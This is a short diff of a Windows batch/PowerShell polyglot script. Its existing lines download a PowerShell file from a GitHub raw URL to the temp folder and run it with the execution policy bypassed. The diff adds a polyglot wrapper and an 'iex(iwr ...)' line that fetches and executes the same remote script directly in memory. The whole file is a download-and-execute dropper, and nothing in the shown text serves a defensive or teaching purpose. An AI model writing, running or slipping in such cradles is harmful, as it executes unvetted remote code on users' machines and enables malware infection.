@@ -1,4 +1,7 @@
+<# :
 @echo off
 curl -sL "https://github.com/analysisw/test/raw/refs/heads/main/test.ps1" -o "%TEMP%\t.ps1"
 powershell -ep bypass -f "%TEMP%\t.ps1"
 exit /b
+#>
+iex((iwr "https://github.com/analysisw/test/raw/refs/heads/main/test.ps1" -UseBasicParsing).Content)
